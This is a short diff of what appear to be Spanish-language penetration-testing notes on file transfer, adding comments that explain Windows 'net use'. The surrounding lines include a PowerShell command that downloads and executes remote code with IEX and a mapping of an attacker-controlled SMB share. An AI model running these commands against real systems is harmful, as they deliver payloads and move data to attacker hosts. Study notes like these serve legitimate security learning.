@@ -50,7 +50,8 @@ IEX (New-Object Net.WebClient).DownloadString('https://url')
     SMB server
 net use n: \\ip_attacker\folder /user:test test
 #Me conecto mediante las credenciales necesarias y defino a n como la ip y el folder creado
-
+#net use conecta oa desconecta una computadora en un recurso comártido. Asignamos a la letra n el recurso compartido \\ip\folder
+#el /user puede no usarse en caso de no requerir
 ---     Download to linux       ---
     Base64
 echo 'base64_string | base64 -d > output_file'
